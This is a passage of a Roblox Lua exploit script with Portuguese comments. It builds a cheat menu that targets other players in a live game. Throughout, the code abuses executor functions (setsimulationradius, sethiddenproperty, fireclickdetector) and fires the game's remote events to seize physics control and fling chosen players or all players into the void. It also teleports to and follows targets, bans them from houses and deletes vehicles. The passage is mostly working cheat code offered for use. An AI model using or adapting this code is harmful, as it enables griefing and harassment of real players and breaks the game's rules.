                    kill(TargetRP, CFrame.new(0, -1.5, 2) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05, CFrame.Angles(math.rad(Angles), 0, 0))
                    kill(TargetRP, CFrame.new(2, 1.5, 2.25)  + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(50), 0, 0))
                    kill(TargetRP, CFrame.new(-2.25, -1.5, 2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(30), 0, 0))
                    kill(TargetRP, CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05, CFrame.Angles(math.rad(Angles), 0, 0))
                    kill(TargetRP, CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05, CFrame.Angles(math.rad(Angles), 0, 0))
                end
            end
        end

        local function onPlayerSeated(player)
            if player and player.Character then
                local humanoid = player.Character:FindFirstChild("Humanoid")
                if humanoid and humanoid.SeatPart then
                    if humanoid.SeatPart.Parent:IsA("VehicleSeat") then
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
                        applyKillEffect(player)
                    end
                end
            end
        end

        game:GetService("Players").PlayerAdded:Connect(function(player)
            if player.Name == selectedPlayerName then
                player.CharacterAdded:Connect(function(character)
                    local humanoid = character:WaitForChild("Humanoid")
                    humanoid.Seated:Connect(function(_, seat)
                        if seat then
                            onPlayerSeated(player)
                        end
                    end)
                end)
            end
        end)
    end    
})


local Section = Tab:AddSection({
	Name = "View/Goto"
})


-- Lista de seleção de jogadores para "Goto"
local gotoPlayerList = {}
local selectedGotoPlayer = nil
local avisoToggle = false

local function updatePlayerList()
gotoPlayerList = {}
for _, player in ipairs(game.Players:GetPlayers()) do
table.insert(gotoPlayerList, player.Name)
end
end

updatePlayerList()

Tab:AddDropdown({
Name = "Lista de Jogadores",
Description = "Selecione o jogador alvo para o Goto (couch)",
Options = gotoPlayerList,
Callback = function(playerName)
selectedGotoPlayer = playerName
end
})

-- Adicionar botão para resetar a lista de jogadores
Tab:AddButton({
Name = "Reset Player List",
Callback = function()
updatePlayerList()
playerDropdown:Refresh(gotoPlayerList, true)
end
})

-- Adicionar toggle para view
Tab:AddToggle({
Name = "View",
Default = false,
Callback = function(state)
viewToggle = state
if viewToggle and selectedGotoPlayer then
local player = game.Players:FindFirstChild(selectedGotoPlayer)
if player then
game.Workspace.CurrentCamera.CameraSubject = player.Character.Humanoid
else
print("Jogador não encontrado.")
end
else
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
end
end
})

-- Adicionar toggle para follow
Tab:AddToggle({
Name = "Follow",
Default = false,
Callback = function(state)
followToggle = state
while followToggle do
if selectedGotoPlayer then
local player = game.Players:FindFirstChild(selectedGotoPlayer)
if player then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
else
print("Jogador não encontrado.")
end
end
wait(0.1)
end
end
})

-- Adicionar o botão "Goto" à seção "View/Goto"
Tab:AddButton({
Name = "Goto",
Description = "This player is not on the list",
Callback = function()
if selectedGotoPlayer then
local player = game.Players:FindFirstChild(selectedGotoPlayer)
if player then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
else
print("Jogador não encontrado.")
end
else
print("Nenhum jogador selecionado para o Goto.")
end
end
})


local Section = Tab:AddSection({
	Name = "variable car forms kill"
})


local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

local playerNames = {}
for _, player in pairs(Players:GetPlayers()) do
    table.insert(playerNames, player.Name)
end

local selectedPlayerName = nil

Tab:AddDropdown({
    Name = "Target Player",
    Options = playerNames,
    Callback = function(selected)
        selectedPlayerName = selected
    end
})

local function executeScript()
    local UserInputService = game:GetService("UserInputService")
    local Mouse = game.Players.LocalPlayer:GetMouse()
    local Folder = Instance.new("Folder", Workspace)
    local Part = Instance.new("Part", Folder)
    local Attachment1 = Instance.new("Attachment", Part)
    Part.Anchored = true
    Part.CanCollide = false
    Part.Transparency = 1

    local NetworkAccess = coroutine.create(function()
        settings().Physics.AllowSleep = false
        while RunService.RenderStepped:Wait() do
            for _, player in next, Players:GetPlayers() do
                if player ~= Players.LocalPlayer then
                    player.MaximumSimulationRadius = 0
                    sethiddenproperty(player, "SimulationRadius", 0)
                end
            end
            Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge, math.huge)
            setsimulationradius(math.huge)
        end
    end)
    coroutine.resume(NetworkAccess)

    local function ForceVehicle(v)
        if v:IsA("Model") and v:FindFirstChildOfClass("VehicleSeat") then
            Mouse.TargetFilter = v
            for _, x in next, v:GetDescendants() do
                if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                    x:Destroy()
                end
            end
            if v:FindFirstChild("Attachment") then
                v:FindFirstChild("Attachment"):Destroy()
            end
            if v:FindFirstChild("AlignPosition") then
                v:FindFirstChild("AlignPosition"):Destroy()
            end
            if v:FindFirstChild("Torque") then
                v:FindFirstChild("Torque"):Destroy()
            end
            for _, part in next, v:GetDescendants() do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                    local Torque = Instance.new("Torque", part)
                    Torque.Torque = Vector3.new(100000 * 12, 100000 * 12, 100000 * 12)
                    local AlignPosition = Instance.new("AlignPosition", part)
                    local Attachment2 = Instance.new("Attachment", part)
                    Torque.Attachment0 = Attachment2
                    AlignPosition.MaxForce = 999999
                    AlignPosition.MaxVelocity = math.huge
                    AlignPosition.Responsiveness = 200
                    AlignPosition.Attachment0 = Attachment2
                    AlignPosition.Attachment1 = Attachment1
                end
            end
        end
    end

    for _, v in next, Workspace:GetDescendants() do
        ForceVehicle(v)
    end

    Workspace.DescendantAdded:Connect(function(v)
        ForceVehicle(v)
    end)

    spawn(function()
        while true do
            local voidPosition = Vector3.new(223809667072, 223809667072, -223809667072)
            Attachment1.WorldCFrame = CFrame.new(voidPosition)
            RunService.RenderStepped:Wait()
        end
    end)
end

local function monitorSeats()
    for _, seat in pairs(Workspace:GetDescendants()) do
        if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
            seat:GetPropertyChangedSignal("Occupant"):Connect(function()
                if seat.Occupant then
                    local occupantPlayer = Players:GetPlayerFromCharacter(seat.Occupant.Parent)
                    if occupantPlayer and occupantPlayer.Name == selectedPlayerName then
                        executeScript()
                    end
                end
            end)
        end
    end

    Workspace.DescendantAdded:Connect(function(descendant)
        if descendant:IsA("Seat") or descendant:IsA("VehicleSeat") then
            descendant:GetPropertyChangedSignal("Occupant"):Connect(function()
                if descendant.Occupant then
                    local occupantPlayer = Players:GetPlayerFromCharacter(descendant.Occupant.Parent)
                    if occupantPlayer and occupantPlayer.Name == selectedPlayerName then
                        executeScript()
                    end
                end
            end)
        end
    end)
end

monitorSeats()
Tab:AddButton({
    Name = "Car Fling",
    Callback = function()
        local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local Humanoid = Character:FindFirstChildOfClass("Humanoid")
local RootPart = Character:WaitForChild("HumanoidRootPart")
local Vehicles = game.Workspace:FindFirstChild("Vehicles")
local OldPos = RootPart.CFrame

if not Humanoid or not Vehicles then return end

local function GetCar()
    return Vehicles:FindFirstChild(Player.Name.."Car")
end

local PCar = GetCar()

if not PCar then
    RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
    task.wait(0.5)
    local RemoteEvent = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
    if RemoteEvent and RemoteEvent:FindFirstChild("1Ca1r") then
        RemoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
    end
    task.wait(1)
    PCar = GetCar()
end

if PCar then
    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
    if Seat and not Humanoid.Sit then
        repeat
            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
            task.wait()
        until Humanoid.Sit or not PCar.Parent
    end
end
        wait(0.2)
        
        local UserInputService = game:GetService("UserInputService")
        local RunService = game:GetService("RunService")
        local Mouse = Players.LocalPlayer:GetMouse()
        local Folder = Instance.new("Folder", game:GetService("Workspace"))
        local Part = Instance.new("Part", Folder)
        local Attachment1 = Instance.new("Attachment", Part)
        Part.Anchored = true
        Part.CanCollide = false
        Part.Transparency = 1

        local NetworkAccess = coroutine.create(function()
            settings().Physics.AllowSleep = false
            while RunService.RenderStepped:Wait() do
                for _, player in next, Players:GetPlayers() do
                    if player ~= Players.LocalPlayer then
                        player.MaximumSimulationRadius = 0
                        sethiddenproperty(player, "SimulationRadius", 2)
                    end
                end
                Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge, math.huge)
                setsimulationradius(math.huge)
            end
        end)
        coroutine.resume(NetworkAccess)

        local function ForceVehicle(v)
            if v:IsA("Model") and v:FindFirstChildOfClass("VehicleSeat") then
                Mouse.TargetFilter = v
                for _, x in next, v:GetDescendants() do
                    if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                        x:Destroy()
                    end
                end
                if v:FindFirstChild("Attachment") then
                    v:FindFirstChild("Attachment"):Destroy()
                end
                if v:FindFirstChild("AlignPosition") then
                    v:FindFirstChild("AlignPosition"):Destroy()
                end
                if v:FindFirstChild("Torque") then
                    v:FindFirstChild("Torque"):Destroy()
                end
                for _, part in next, v:GetDescendants() do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                        local Torque = Instance.new("Torque", part)
                        Torque.Torque = Vector3.new(1000 * 102, 100000 * 102, 10000 * 12)
                        local AlignPosition = Instance.new("AlignPosition", part)
                        local Attachment2 = Instance.new("Attachment", part)
                        Torque.Attachment0 = Attachment2
                        AlignPosition.MaxForce = 99999
                        AlignPosition.MaxVelocity = math.huge
                        AlignPosition.Responsiveness = 200
                        AlignPosition.Attachment0 = Attachment2
                        AlignPosition.Attachment1 = Attachment1
                    end
                end
            end
        end

        for _, v in next, game:GetService("Workspace"):GetDescendants() do
            ForceVehicle(v)
        end

        game:GetService("Workspace").DescendantAdded:Connect(function(v)
            ForceVehicle(v)
        end)

        spawn(function()
            while true do
                if selectedPlayerName then
                    local player = Players:FindFirstChild(selectedPlayerName)
                    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        local rootPart = player.Character.HumanoidRootPart
                        Attachment1.WorldCFrame = rootPart.CFrame
                    end
                end
                RunService.RenderStepped:Wait()
            end
        end)

        wait(4)
        
        local targetPosition = Vector3.new(223809667072, 223809667072, -223809667072)
        player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)

        local function onPlayerSeated(player)
            if player and player.Character then
                local humanoid = player.Character:FindFirstChild("Humanoid")
                if humanoid and humanoid.SeatPart then
                    if humanoid.SeatPart.Parent:IsA("VehicleSeat") then
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
                    end
                end
            end
        end

        game:GetService("Players").PlayerAdded:Connect(function(player)
            if player.Name == selectedPlayerName then
                player.CharacterAdded:Connect(function(character)
                    local humanoid = character:WaitForChild("Humanoid")
                    humanoid.Seated:Connect(function(_, seat)
                        if seat then
                            onPlayerSeated(player)
                        end
                    end)
                end)
            end
        end)
    end    
})


local function executeScript()
    local UserInputService = game:GetService("UserInputService")
    local Mouse = game.Players.LocalPlayer:GetMouse()
    local Folder = Instance.new("Folder", Workspace)
    local Part = Instance.new("Part", Folder)
    local Attachment1 = Instance.new("Attachment", Part)
    Part.Anchored = true
    Part.CanCollide = false
    Part.Transparency = 1

    local NetworkAccess = coroutine.create(function()
        settings().Physics.AllowSleep = false
        while RunService.RenderStepped:Wait() do
            for _, player in next, Players:GetPlayers() do
                if player ~= Players.LocalPlayer then
                    player.MaximumSimulationRadius = 0
                    sethiddenproperty(player, "SimulationRadius", 0)
                end
            end
            Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge, math.huge)
            setsimulationradius(math.huge)
        end
    end)
    coroutine.resume(NetworkAccess)

    local function ForceVehicle(v)
        if v:IsA("Model") and v:FindFirstChildOfClass("VehicleSeat") then
            Mouse.TargetFilter = v
            for _, x in next, v:GetDescendants() do
                if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                    x:Destroy()
                end
            end
            if v:FindFirstChild("Attachment") then
                v:FindFirstChild("Attachment"):Destroy()
            end
            if v:FindFirstChild("AlignPosition") then
                v:FindFirstChild("AlignPosition"):Destroy()
            end
            if v:FindFirstChild("Torque") then
                v:FindFirstChild("Torque"):Destroy()
            end
            for _, part in next, v:GetDescendants() do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                    local Torque = Instance.new("Torque", part)
                    Torque.Torque = Vector3.new(100000 * 12, 100000 * 12, 100000 * 12)
                    local AlignPosition = Instance.new("AlignPosition", part)
                    local Attachment2 = Instance.new("Attachment", part)
                    Torque.Attachment0 = Attachment2
                    AlignPosition.MaxForce = 999999
                    AlignPosition.MaxVelocity = math.huge
                    AlignPosition.Responsiveness = 200
                    AlignPosition.Attachment0 = Attachment2
                    AlignPosition.Attachment1 = Attachment1
                end
            end
        end
    end

    for _, v in next, Workspace:GetDescendants() do
        ForceVehicle(v)
    end
    Workspace.DescendantAdded:Connect(function(v)
        ForceVehicle(v)
    end)
    spawn(function()
        while true do
            local voidPosition = Vector3.new(0, -470, 0)
            Attachment1.WorldCFrame = CFrame.new(voidPosition)
            RunService.RenderStepped:Wait()
        end
    end)
end
local function monitorSeats()
    for _, seat in pairs(Workspace:GetDescendants()) do
        if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
            seat:GetPropertyChangedSignal("Occupant"):Connect(function()
                if seat.Occupant then
                    local occupantPlayer = Players:GetPlayerFromCharacter(seat.Occupant.Parent)
                    if occupantPlayer and occupantPlayer.Name == selectedPlayerName then
                        executeScript()
                    end
                end
            end)
        end
    end
    Workspace.DescendantAdded:Connect(function(descendant)
        if descendant:IsA("Seat") or descendant:IsA("VehicleSeat") then           descendant:GetPropertyChangedSignal("Occupant"):Connect(function()
                if descendant.Occupant then
                    local occupantPlayer = Players:GetPlayerFromCharacter(descendant.Occupant.Parent)
                    if occupantPlayer and occupantPlayer.Name == selectedPlayerName then
                        executeScript()
                    end
                end
            end)
        end
    end)
end
monitorSeats()
Tab:AddButton({
    Name = "Car kill",
    Callback = function()
        local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local Humanoid = Character:FindFirstChildOfClass("Humanoid")
local RootPart = Character:WaitForChild("HumanoidRootPart")
local Vehicles = game.Workspace:FindFirstChild("Vehicles")
local OldPos = RootPart.CFrame

if not Humanoid or not Vehicles then return end

local function GetCar()
    return Vehicles:FindFirstChild(Player.Name.."Car")
end

local PCar = GetCar()

if not PCar then
    RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
    task.wait(0.5)
    local RemoteEvent = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
    if RemoteEvent and RemoteEvent:FindFirstChild("1Ca1r") then
        RemoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
    end
    task.wait(1)
    PCar = GetCar()
end
if PCar then
    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
    if Seat and not Humanoid.Sit then
        repeat
            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
            task.wait()
        until Humanoid.Sit or not PCar.Parent
    end
end
        wait(0.2)
        
        local UserInputService = game:GetService("UserInputService")
        local RunService = game:GetService("RunService")
        local Mouse = Players.LocalPlayer:GetMouse()
        local Folder = Instance.new("Folder", game:GetService("Workspace"))
        local Part = Instance.new("Part", Folder)
        local Attachment1 = Instance.new("Attachment", Part)
        Part.Anchored = true
        Part.CanCollide = false
        Part.Transparency = 1

        local NetworkAccess = coroutine.create(function()
            settings().Physics.AllowSleep = false
            while RunService.RenderStepped:Wait() do
                for _, player in next, Players:GetPlayers() do
                    if player ~= Players.LocalPlayer then
                        player.MaximumSimulationRadius = 0
                        sethiddenproperty(player, "SimulationRadius", 2)
                    end
                end
                Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge, math.huge)
                setsimulationradius(math.huge)
            end
        end)
        coroutine.resume(NetworkAccess)
        local function ForceVehicle(v)
            if v:IsA("Model") and v:FindFirstChildOfClass("VehicleSeat") then
                Mouse.TargetFilter = v
                for _, x in next, v:GetDescendants() do
                    if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                        x:Destroy()
                    end
                end
                if v:FindFirstChild("Attachment") then
                    v:FindFirstChild("Attachment"):Destroy()
                end
                if v:FindFirstChild("AlignPosition") then
                    v:FindFirstChild("AlignPosition"):Destroy()
                end
                if v:FindFirstChild("Torque") then
                    v:FindFirstChild("Torque"):Destroy()
                end
                for _, part in next, v:GetDescendants() do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                        local Torque = Instance.new("Torque", part)
                        Torque.Torque = Vector3.new(1000 * 102, 100000 * 102, 10000 * 12)
                        local AlignPosition = Instance.new("AlignPosition", part)
                        local Attachment2 = Instance.new("Attachment", part)
                        Torque.Attachment0 = Attachment2
                        AlignPosition.MaxForce = 99999
                        AlignPosition.MaxVelocity = math.huge
                        AlignPosition.Responsiveness = 200
                        AlignPosition.Attachment0 = Attachment2
                        AlignPosition.Attachment1 = Attachment1
                    end
                end
            end
        end

        for _, v in next, game:GetService("Workspace"):GetDescendants() do
            ForceVehicle(v)
        end    game:GetService("Workspace").DescendantAdded:Connect(function(v)
            ForceVehicle(v)
        end)
        spawn(function()
            while true do
                if selectedPlayerName then
                    local player = Players:FindFirstChild(selectedPlayerName)
                    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        local rootPart = player.Character.HumanoidRootPart
                        Attachment1.WorldCFrame = rootPart.CFrame
                    end
                end
                RunService.RenderStepped:Wait()
            end
        end)

        wait(4)
        
        local targetPosition = Vector3.new(101, -446, -180)
        player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)

        local function onPlayerSeated(player)
            if player and player.Character then
                local humanoid = player.Character:FindFirstChild("Humanoid")
                if humanoid and humanoid.SeatPart then
                    if humanoid.SeatPart.Parent:IsA("VehicleSeat") then
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
                    end
                end
            end
        end

        game:GetService("Players").PlayerAdded:Connect(function(player)
            if player.Name == selectedPlayerName then
                player.CharacterAdded:Connect(function(character)
                    local humanoid = character:WaitForChild("Humanoid")
                    humanoid.Seated:Connect(function(_, seat)
                        if seat then
                            onPlayerSeated(player)
                        end
                    end)
                end)
            end
        end)
    end    
})


local Section = Tab:AddSection({
	Name = "Ban House Kill"
})


local selectedPlayer

local function ShowPlayerList()
    local playerNames = {}
    for _, player in pairs(game.Players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end
    
    Tab:AddDropdown({
        Name = "Target",
        Default = playerNames[1],
        Options = playerNames,
        Callback = function(Value)
            selectedPlayer = game.Players:FindFirstChild(Value)
            print("Jogador selecionado: " .. Value)
        end
    })
end

ShowPlayerList()


Tab:AddButton({
    Name = "House Ban",
    Callback = function()
        local Player = game.Players.LocalPlayer
    local Backpack = Player.Backpack
    local Character = Player.Character
    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Character:FindFirstChild("HumanoidRootPart")
    local Houses = game.Workspace:FindFirstChild("001_Lots")
    local OldPos = RootPart.CFrame
    local Angles = 0
    local Vehicles = Workspace.Vehicles
    local Pos

   
    function Check()
        if Player and Character and Humanoid and RootPart and Vehicles then
            return true
        else
            return false
        end
    end

  
    if selectedPlayer and selectedPlayer.Character then
        if Check() then
            local House = Houses:FindFirstChild(Player.Name.."House")
            if not House then
                local EHouse
                for _,Lot in pairs(Houses:GetChildren()) do
                    if Lot.Name == "For Sale" then
                        for _,num in pairs(Lot:GetDescendants()) do
                            if num:IsA("NumberValue") and num.Name == "Number" and num.Value < 25 and num.Value > 10 then
                                EHouse = Lot
                                break
                            end
                        end
                    end
                end

                local BuyDetector = EHouse:FindFirstChild("BuyHouse")
                Pos = BuyDetector.Position
                if BuyDetector and BuyDetector:IsA("BasePart") then
                    RootPart.CFrame = BuyDetector.CFrame + Vector3.new(0,-6,0)
                    task.wait(.5)
                    local ClickDetector = BuyDetector:FindFirstChild("ClickDetector")
                    if ClickDetector then
                        fireclickdetector(ClickDetector)
                    end
                end
            end

            task.wait(0.5)
            local PreHouse = Houses:FindFirstChild(Player.Name .. "House")
            if PreHouse then
                task.wait(0.5)
                local Number
                for i,x in pairs(PreHouse:GetDescendants()) do
                    if x.Name == "Number" and x:IsA("NumberValue") then
                        Number = x
                    end
                end
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gettin1gHous1e"):FireServer("PickingCustomHouse","049_House", Number.Value)
            end

            task.wait(0.5)
            local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
            if not PCar then
                if Check() then
                    RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                    task.wait(0.5)
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar","SchoolBus")
                    task.wait(0.5)
                    local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
                    task.wait(0.5)
                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                    if Seat then
                        repeat task.wait()
                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                        until Humanoid.Sit
                    end
                end
            end

            task.wait(0.5)
            local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
            if PCar then
                if not Humanoid.Sit then
                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                    if Seat then
                        repeat task.wait()
                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                        until Humanoid.Sit
                    end
                end

                local Target = selectedPlayer
                local TargetC = Target.Character
                local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
                local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")
                if TargetC and TargetH and TargetRP then
                    if not TargetH.Sit then
                        while not TargetH.Sit do
                            task.wait()
                            local Fling = function(alvo,pos,angulo)
                                PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)
                            end
                            Angles = Angles + 100
                            Fling(TargetRP,CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP,CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP,CFrame.new(2.25, 1.5, -2.25)  + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP,CFrame.new(-2.25, -1.5, 2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP,CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP,CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                        end

                        task.wait(0.2)
                        local House = Houses:FindFirstChild(Player.Name.."House")
                        PCar:SetPrimaryPartCFrame(CFrame.new(House.HouseSpawnPosition.Position))
                        task.wait(0.2)
                        local pedro = Region3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(30,30,30),game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(30,30,30))

                        local a = workspace:FindPartsInRegion3(pedro,game.Players.LocalPlayer.Character.HumanoidRootPart,math.huge)

                        for i,v in pairs(a) do
                            if v.Name == "HumanoidRootPart" then
                                local b = game:GetService("Players"):FindFirstChild(v.Parent.Name)
                                local args = {
                                    [1] = "BanPlayerFromHouse",
                                    [2] = b,
                                    [3] = v.Parent
                                }

                                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))

                               
                                local args = {
                                    [1] = "DeleteAllVehicles"
                                }
                                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
                            end
                        end
                    end
                end
            end
        end
    end
    end
})


local Section = Tab:AddSection({
	Name = "All Car variables"
})


Tab:AddButton({
	Name = "Car kill all[Beta]",
	Callback = function()
      		local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")
        local OldPos = RootPart.CFrame

        if not Humanoid or not RootPart then return end

        -- Lista de proteção
        local ProtectedList = {
            [7870544119] = true,
            [7680301371] = true,
            [3845424860] = true,
            [7991200153] = true,
            [7685128251] = true,
            [7118994826] = true,
            [7905238071] = true,
            [2803402717] = true,
            [3396788926] = true,
            [4863206819] = true,
            [1549110910] = true,
            [4854018750] = true,
            [807242034] = true,
            [4432430525] = true,
        }

        local PlayersList = {} -- Lista de jogadores a serem processados
        for _, p in pairs(game.Players:GetPlayers()) do
            if p ~= Player and not ProtectedList[p.UserId] then
                table.insert(PlayersList, p)
            end
        end

        local function ProcessPlayer(TargetPlayer)
            local PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
            if not PCar then
                RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")
                task.wait(0.5)
                PCar = Vehicles:FindFirstChild(Player.Name .. "Car")
                local Seat = PCar and PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                if Seat then
                    repeat
                        task.wait()
                        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                    until Humanoid.Sit
                end
            end

            local TargetC = TargetPlayer.Character
            if TargetC then
                local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
                local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")
                if TargetH and TargetRP then
                    while not TargetH.Sit do
                        task.wait()

                        -- Rotação aleatória ao redor do jogador
                        local randomX = math.random(-1000, 1000)
                        local randomY = math.random(-1000, 1000)
                        local randomZ = math.random(-1000, 1000)

                        -- Função para movimentar o carro
                        local moveCar = function(alvo, offset, rotation)
                            local newPosition = alvo.Position + offset
                            local newCFrame = CFrame.new(newPosition) * rotation
                            PCar:SetPrimaryPartCFrame(newCFrame)
                        end

                        -- Movimentos do carro ao redor do jogador alvo
                        moveCar(TargetRP, Vector3.new(0, 1, 0), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        moveCar(TargetRP, Vector3.new(0, -2.25, 5), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        moveCar(TargetRP, Vector3.new(0, 2.25, 0.25), CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                    end

                    -- Teleporte para a coordenada final
                    task.wait(0.1)
                    PCar:SetPrimaryPartCFrame(CFrame.new(0, -600, 0))

                    -- Espera e apaga o carro
                    task.wait(0.6)
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles")
                    task.wait(0.2)
                    Humanoid.Sit = false
                    RootPart.CFrame = OldPos
                end
            end
        end

        -- Processa cada jogador da lista
        for _, TargetPlayer in ipairs(PlayersList) do
            ProcessPlayer(TargetPlayer)
        end
print("button pressed")
  	end    
})


Tab:AddButton({
	Name = "Fling Boat all",
	Callback = function()
      	 local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")
        local OldPos = RootPart.CFrame
        local Angles = 0
        local PCar = Vehicles:FindFirstChild(Player.Name.."Car")

        -- Se não tiver um carro, cria um
        if not PCar then
            if RootPart then
                RootPart.CFrame = CFrame.new(1754, -2, 58)
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")
                task.wait(0.5)
                PCar = Vehicles:FindFirstChild(Player.Name.."Car")
                task.wait(0.5)
                local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                if Seat then
                    repeat
                        task.wait()
                        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                    until Humanoid.Sit
                end
            end
        end

        task.wait(0.5)
        PCar = Vehicles:FindFirstChild(Player.Name.."Car")

        -- Se o carro existir, teletransporta para o assento se necessário
        if PCar then
            if not Humanoid.Sit then
                local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                if Seat then
                    repeat
                        task.wait()
